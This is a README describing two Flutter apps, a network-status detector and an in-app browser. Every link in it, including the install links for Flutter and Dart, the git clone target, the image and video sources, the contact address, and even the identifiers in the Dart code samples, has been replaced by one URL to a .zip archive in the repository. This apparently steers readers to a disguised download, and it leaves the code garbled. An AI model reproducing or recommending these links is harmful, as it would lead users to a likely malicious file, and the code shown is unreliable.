<details> 
  <summary><h2>📶Flutter Network Status Detector</h2></summary>
  
# Flutter Network Status Detector

![Network Status Detector](https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip)


## Overview

**Flutter Network Status Detector** is a Flutter application that detects the internet or WiFi connectivity status in real-time and updates the UI accordingly. This application is designed to provide users with immediate feedback about their network connection status.

## Features

- **Real-time Network Detection**: Detects changes in internet or WiFi connectivity instantly.
- **Dynamic UI Updates**: Displays different interfaces depending on the network status.
- **Cross-Platform**: Runs on both Android and iOS devices.
- **Minimal Dependencies**: Lightweight and efficient performance.

## Screenshots
### Online
<p>
    <table align="center">
      <tr>
        <td><img src="https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip" alt="Image 2" width="180" height="auto"></td>
      </tr>
    </table>    
</p>

### Offline
<p>
    <table align="center">
      <tr>
        <td><img src="https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip" alt="Image 2" width="180" height="auto"></td>
      </tr>
    </table>    
</p>


### Video

https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip


## Getting Started

Follow these instructions to get a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

- [Flutter](https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip) installed on your machine.
- [Dart](https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip) SDK.

### Installation Steps

1. *Clone the repository:*

    ```bash
    git clone https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
    ```

2. *Install dependencies:*

    ```bash
    flutter pub get
    ```

3. *Run the app:*

    ```bash
    flutter run
    ```
    
## Usage
Once the application is running, it will automatically detect your network status. Here's a step-by-step guide on how to use the app.

## Code Overview
```dart
StreamBuilder(
      stream: Connectivity().onConnectivityChanged,
      builder: (context, snapshot) {
        if (https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip!.contains(https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip)) {
          return Center(child: Text('Mobile is connected to Mobile Data'));
        } else if (https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip!.contains(https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip)) {
          return Center(child: Text('Mobile is connected to Wifi'));
        } else {
          return Center(
            child: Container(
              height: 350,
              width: 450,
              decoration: const BoxDecoration(
                color: https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip,
                image: DecorationImage(
                  fit: https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip,
                  image: AssetImage('https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip'),
                ),
              ),
            ),
          );
        }
      },
    );
```
### Technologies Used
- *Flutter*: For building the cross-platform mobile application.
- *Dart*: The programming language used by Flutter.

```bash
flutter-network-status-detector/
├── android/
├── ios/
├── lib/
│   ├── https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
│   ├── screens/
│   │   ├── https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
│   │   ├── https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
│   │   └── https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
├── test/
├── .gitignore
├── https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
└── https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
```
## Key Files
- *https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip*: The entry point for the application.
- *https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip*: The main screen that handles navigation and initial network detection.
- *https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip*: The screen displayed when the network is connected.
- *https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip*: The screen displayed when the network is disconnected.

### Contributing
Contributions are what make the open-source community such an amazing place to learn, inspire, and create. Any contributions you make are greatly appreciated.

If you would like to contribute to this project, please follow these steps:

1. Fork the repository.
2. Create a new branch (git checkout -b feature/YourFeature).
3. Commit your changes (git commit -am 'Add some feature').
4. Push to the branch (git push origin feature/YourFeature).
5. Create a new Pull Request.

### License
Distributed under the MIT License. See `LICENSE` for more information.

### Contact
My Mail - https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
</details>
<details>
  <summary><h2>🔍In-App Browser Flutter App</h2></summary>

A single-page Flutter application that displays an in-app browser using the `flutter_inappwebview` package. This app is designed to provide a seamless web browsing experience within a Flutter application.

## Features

- **In-App Browser:** Embed a fully functional web browser within your Flutter app.
- **Smooth Performance:** Optimized for smooth browsing experience.
- **Cross-Platform:** Works on both Android and iOS.
- **Customizable:** Easily customizable to fit your app's design and functionality needs.

## Screenshots

<details> 
  <summary><h2>📸Photos</h2></summary>
  <p>
    <table align="center">
  <tr>
    <td><img src="https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip" alt="Image 2" width="180" height="auto"></td>
    <td><img src="https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip" alt="Image 2" width="180" height="auto"></td>
  </tr>
    </table>    
  </p>
  </details>
  <details> 
  <summary><h2>📽️Video</h2></summary>
  <p>
    <table align="center">
  <tr>
    <video src ="https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip"></video> </h1>
  </tr>
    </table>   
  </p>
  </details>

## Getting Started

### Prerequisites

- Flutter SDK: [Install Flutter](https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip)
- Dart: [Install Dart](https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip)

### Installation

1. *Clone the repository:*

    ```bash
    git clone https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
    ```

2. *Install dependencies:*

    ```bash
    flutter pub get
    ```

3. *Run the app:*

    ```bash
    flutter run
    ```
## Code Example
```dart
InAppWebView(
        initialUrlRequest: URLRequest(url: https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip("https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip")),
        onWebViewCreated: (controller) {
          webViewController = controller;
        },
      ),
    );
```

## Contributing

If you would like to contribute to this project, please follow these steps:

1. Fork the repository.
2. Create a new branch (git checkout -b feature/YourFeature).
3. Commit your changes (git commit -am 'Add some feature').
4. Push to the branch (git push origin feature/YourFeature).
5. Create a new Pull Request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Contact

If you have any questions or suggestions, feel free to open an issue or contact me at [https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip].

---

Happy coding!
</details>
